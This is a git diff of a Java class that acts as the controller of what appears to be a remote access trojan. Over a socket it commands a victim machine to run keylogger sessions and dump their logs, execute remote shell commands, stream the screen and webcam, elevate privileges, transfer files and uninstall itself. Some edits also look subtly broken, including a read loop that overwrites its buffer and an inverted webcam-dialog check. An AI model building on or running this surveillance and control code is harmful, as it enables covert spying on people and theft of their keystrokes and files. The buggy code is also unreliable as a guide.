@@ -1,15 +1,19 @@
 package Connections;
 
 
-import GUI.ProgressBar.DownloadProgressBar;
+import GUI.TableUtils.Connection.Connection;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.Permissions.Permissions;
+import GUI.TableUtils.ReverseShell.Shell;
+import GUI.TableUtils.ScreenStreaming.Screen;
 import GUI.TableUtils.SystemState.State;
 import Information.*;
 
+import Information.Action;
 import org.json.JSONObject;
 
 
+import javax.swing.*;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
@@ -21,10 +25,8 @@ import java.util.concurrent.Executors;
 
 public class Streams {
 
-    private InputStream is;
-    private OutputStream os;
-    private DataInputStream dis;
-    private DataOutputStream dos;
+    private final DataInputStream dis;
+    private final DataOutputStream dos;
     private SystemInformation tempSystemInformation;
     private NetworkInformation tempNetworkInformation;
     private boolean webcamDialogOpen;
@@ -35,8 +37,8 @@ public class Streams {
     public Streams(Socket socket) throws IOException {
         if (socket == null) throw new IllegalArgumentException();
         clientSocket = socket;
-        is = socket.getInputStream();
-        os = socket.getOutputStream();
+        InputStream is = socket.getInputStream();
+        OutputStream os = socket.getOutputStream();
         dis = new DataInputStream(is);
         dos = new DataOutputStream(os);
     }
@@ -65,7 +67,11 @@ public class Streams {
     public void receiveFile(String path) throws IOException {
         String fileName = readString();
         File filePath = new File(path + "\\" + fileName);
-        filePath.getParentFile().mkdirs();
+        if (!filePath.getParentFile().mkdirs()) {
+            SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "Error creating folder, check permissions!",
+                    "Error creating folder", JOptionPane.ERROR_MESSAGE));
+        }
+
 
         boolean resultOfCreation = filePath.createNewFile();
 
@@ -84,7 +90,7 @@ public class Streams {
         BufferedOutputStream bos = new BufferedOutputStream(fos);
         while (total < fileSize) {
             try {
-                read = is.read(buffer);
+                read = dis.read(buffer);
                 total += read;
                 bos.write(buffer, 0, read);
             } catch (IOException e) {
@@ -124,7 +130,7 @@ public class Streams {
         );
     }
 
-    public Object sendAndReadJSON(Action action) throws IOException {
+    public Object sendAction(Action action) throws IOException {
         switch (action) {
             case SYS_INFO -> {
                 sendSize(0);
@@ -152,37 +158,31 @@ public class Streams {
         return null;
     }
 
-    public void sendJSON(Action action, List<String> destinations, int length) throws IOException {
-        switch (action) {
-            case UPLOAD -> {
-                sendSize(10);
-                sendList(destinations);
-                sendSize(length);
-            }
+    public void sendAction(Action action, List<String> destinations, int length) throws IOException {
+        if (action == Action.UPLOAD) {
+            sendSize(10);
+            sendList(destinations);
+            sendSize(length);
         }
     }
 
-    public void sendAndReadJSON(Action action, List<String> fileList, List<String> directoryList) throws IOException {
-        switch (action) {
-            case COPY -> {
-                sendSize(6);
-                sendList(fileList);
-                sendList(directoryList);
-            }
+    public void sendAction(Action action, List<String> fileList, List<String> directoryList) throws IOException {
+        if (action == Action.COPY) {
+            sendSize(6);
+            sendList(fileList);
+            sendList(directoryList);
         }
     }
 
-    public void sendAndReadJSON(Action action, List<String> fileList, String directory) throws IOException {
-        switch (action) {
-            case MOVE -> {
-                sendSize(7);
-                sendList(fileList);
-                sendString(directory);
-            }
+    public void sendAction(Action action, List<String> fileList, String directory) throws IOException {
+        if (action == Action.MOVE) {
+            sendSize(7);
+            sendList(fileList);
+            sendString(directory);
         }
     }
 
-    public List<String> sendAndReadJSON(Action action, String name) throws IOException {
+    public List<String> sendAndReadAction(Action action, String name) throws IOException {
         switch (action) {
             case R_A_DIR -> {
                 sendSize(3);
@@ -199,19 +199,16 @@ public class Streams {
         return null;
     }
 
-    public String sendAndReadJSONX(Action action, String command) throws IOException {
-        switch (action) {
-            case SHELL_COMMAND -> {
-                sendSize(11);
-                sendString(command);
-                return readString();
-            }
-
+    public String sendAndReadAction(Shell action, String command) throws IOException {
+        if (action == Shell.COMMAND) {
+            sendSize(11);
+            sendString(command);
+            return readString();
         }
         return null;
     }
 
-    public void sendAnd(Action action, String command) throws IOException {
+    public void sendAction(Action action, String command) throws IOException {
         switch (action) {
             case KEYBOARD_COMMAND -> {
                 sendSize(18);
@@ -225,21 +222,19 @@ public class Streams {
         }
     }
 
-    public Object sendAndReadJSON(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
-        switch (action) {
-            case START_WEBCAM -> {
-                sendSize(17);
-                sendString(selectedDevice);
-                sendSize(fragmented ? 1 : 0);
-                sendSize(fps);
-                return new int[]{readSize(), readSize()};
-            }
+    public Object sendAndReadAction(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
+        if (action == Action.START_WEBCAM) {
+            sendSize(17);
+            sendString(selectedDevice);
+            sendSize(fragmented ? 1 : 0);
+            sendSize(fps);
+            return new int[]{readSize(), readSize()};
         }
         return null;
     }
 
 
-    public void sendAndReadJSON(Action action, List<String> fileList) throws IOException {
+    public void sendAction(Action action, List<String> fileList) throws IOException {
         switch (action) {
             case DOWNLOAD -> {
                 sendSize(5);
@@ -256,20 +251,20 @@ public class Streams {
         }
     }
 
-    public void sendJSON(KeyloggerEvents event) throws IOException {
-        String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/"+new Time().getTime();
+    public void sendAction(KeyloggerEvents event) throws IOException {
+        String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/" + new Time().getTime();
         switch (event) {
             case START -> sendSize(12);
             case STOP -> sendSize(13);
             case DUMP_LAST -> {
-                if (sendAndReadJSONX(KeyloggerEvents.CHECK_LAST)) {
+                if (sendAndReadAction(KeyloggerEvents.CHECK_LAST)) {
                     sendSize(1401);
                     receiveFile(nameOfSession);
                     FolderOpener.open(nameOfSession);
                 }
             }
             case DUMP_ALL -> {
-                if (sendAndReadJSONX(KeyloggerEvents.CHECK_ALL)) {
+                if (sendAndReadAction(KeyloggerEvents.CHECK_ALL)) {
                     sendSize(1402);
                     receiveLogs(nameOfSession);
                     FolderOpener.open(nameOfSession);
@@ -285,15 +280,15 @@ public class Streams {
         }
     }
 
-    public boolean sendAndReadJSONX(KeyloggerEvents event) throws IOException {
+    public boolean sendAndReadAction(KeyloggerEvents event) throws IOException {
         switch (event) {
             case STATE -> {
                 sendSize(15);
-                return (readSize()!=0);
+                return (readSize() != 0);
             }
             case CHECK_LAST -> {
                 sendSize(1403);
-                return (readSize()!=0);
+                return (readSize() != 0);
             }
             case CHECK_ALL -> {
                 sendSize(1404);
@@ -303,37 +298,33 @@ public class Streams {
         return false;
     }
 
-    public boolean sendAndReadJSON(Permissions permissions) throws IOException {
+    public int sendAndReadAction(Permissions permissions) throws IOException {
         switch (permissions) {
             case IS_ADMIN -> {
                 sendSize(19);
-                return readSize()!=0;
+                return readSize();
             }
             case ELEVATE_PRIVILEGES -> {
                 sendSize(20);
-                return readSize() != 0;
+                return readSize();
             }
 
         }
-        return false;
+        return 0;
     }
 
-    public void startScreen(Action action) throws IOException {
-        switch (action) {
-            case SCREEN_STREAM -> {
-                sendSize(22);
-            }
-
-
+    public void sendAction(Screen action) throws IOException {
+        if (action == Screen.STREAM) {
+            sendSize(22);
         }
     }
 
-    public void connectionsAction(Action action) throws IOException {
+
+    public void sendAction(Connection action) throws IOException {
         switch (action) {
             case RESTART -> sendSize(-1);
             case DISCONNECT -> sendSize(-2);
             case UNINSTALL -> sendSize(-3);
-
         }
     }
 
@@ -345,16 +336,6 @@ public class Streams {
         }
     }
 
-    public int sendAndReadJSONX(Permissions permissions) throws IOException {
-        switch (permissions) {
-            case ELEVATE_PRIVILEGES -> {
-                sendSize(20);
-                return readSize();
-            }
-
-        }
-        return 0;
-    }
 
 
     public void sendList(List<String> fileList) throws IOException {
@@ -390,7 +371,10 @@ public class Streams {
     public String readString() throws IOException {
         int size = readSize();
         byte[] buffer = new byte[size];
-        int read = is.read(buffer, 0, size);
+        int read = 0;
+        while (read < size) {
+            read += dis.read(buffer, 0, size);
+        }
         return new String(buffer);
     }
 
@@ -423,7 +407,7 @@ public class Streams {
     }
 
     public boolean isWebcamDialogOpen() {
-        return webcamDialogOpen;
+        return !webcamDialogOpen;
     }
 
     public void setWebcamDialogOpen(boolean webcamDialogOpen) {
